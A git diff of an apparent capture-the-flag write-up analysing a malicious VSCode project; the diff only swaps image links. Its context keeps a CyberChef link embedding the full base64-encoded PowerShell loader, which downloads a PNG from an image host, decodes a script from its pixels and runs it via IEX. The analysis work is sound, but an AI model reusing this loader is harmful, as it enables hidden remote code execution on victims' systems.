@@ -29,7 +29,7 @@ Turns out that besides information regarding the project, this file can also run
 
 We copy the encoded command and navigate to CyberChef, an online tool with builtin tools that will help us get back the [decoded command](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Remove_null_bytes()&input=Y3dCaEFHd0FJQUJoQUNBQVRnQmxBSGNBTFFCUEFHSUFhZ0JsQUdNQWRBQTdBRUVBWkFCa0FDMEFWQUI1QUhBQVpRQWdBQzBBUVFBZ0FGTUFlUUJ6QUhRQVpRQnRBQzRBUkFCeUFHRUFkd0JwQUc0QVp3QTdBQ1FBWndBOUFHRUFJQUJUQUhrQWN3QjBBR1VBYlFBdUFFUUFjZ0JoQUhjQWFRQnVBR2NBTGdCQ0FHa0FkQUJ0QUdFQWNBQW9BQ2dBWVFBZ0FFNEFaUUIwQUM0QVZ3QmxBR0lBUXdCc0FHa0FaUUJ1QUhRQUtRQXVBRThBY0FCbEFHNEFVZ0JsQUdFQVpBQW9BQ0lBYUFCMEFIUUFjQUJ6QURvQUx3QXZBR2tBTGdCcEFHSUFZZ0F1QUdNQWJ3QXZBREVBV1FCTkFFNEFOd0JvQUZBQVNBQXZBRzRBYlFCdkFHVUFjZ0J0QUdZQWJ3QmxBR2tBWndCdUFHVUFjZ0F1QUhBQWJnQm5BQ0lBS1FBcEFEc0FKQUJ2QUQwQVlRQWdBRUlBZVFCMEFHVUFXd0JkQUNBQU5nQTRBREFBTUFBN0FDZ0FNQUF1QUM0QU13QXpBQ2tBZkFBbEFIc0FaZ0J2QUhJQVpRQmhBR01BYUFBb0FDUUFlQUFnQUdrQWJnQW9BREFBTGdBdUFERUFPUUE1QUNrQUtRQjdBQ1FBY0FBOUFDUUFad0F1QUVjQVpRQjBBRkFBYVFCNEFHVUFiQUFvQUNRQWVBQXNBQ1FBWHdBcEFEc0FKQUJ2QUZzQUpBQmZBQ29BTWdBd0FEQUFLd0FrQUhnQVhRQTlBQ2dBV3dCdEFHRUFkQUJvQUYwQU9nQTZBRVlBYkFCdkFHOEFjZ0FvQUNnQUpBQndBQzRBUWdBdEFHSUFZUUJ1QUdRQU1RQTFBQ2tBS2dBeEFEWUFLUUF0QUdJQWJ3QnlBQ2dBSkFCd0FDNEFSd0FnQUMwQVlnQmhBRzRBWkFBZ0FERUFOUUFwQUNrQWZRQjlBRHNBU1FCRkFGZ0FLQUJiQUZNQWVRQnpBSFFBWlFCdEFDNEFWQUJsQUhnQWRBQXVBRVVBYmdCakFHOEFaQUJwQUc0QVp3QmRBRG9BT2dCQkFGTUFRd0JKQUVrQUxnQkhBR1VBZEFCVEFIUUFjZ0JwQUc0QVp3QW9BQ1FBYndCYkFEQUFMZ0F1QURZQU5nQXlBRGdBWFFBcEFDa0E&oeol=CRLF):  
 
-![alt text](/posts/writeups/trojan2025/school-project/image1.png)  
+![alt text](/posts/writeups/trojan2025/school-project/image2.png)  
 
 So the command that will be run from this suspicious VSCode project is:  
 ```powershell
@@ -40,7 +40,7 @@ Very interesting...
 This command opens a `.png` image from the `https://i.ibb.co` website, reads its pixels, for each pixel it gets its RGB values and performs bitwise OR operations.  
 The `png` it tries to load is the following:  
 
-![alt text](/posts/writeups/trojan2025/school-project/image1.png)  
+![alt text](/posts/writeups/trojan2025/school-project/image3.png)  
 
 After it has completed its parsing of the pixels RGB values, it executes the result via `IEX`. This immediately raises red flags as we have execution of whatever is inside these pixels.  
 
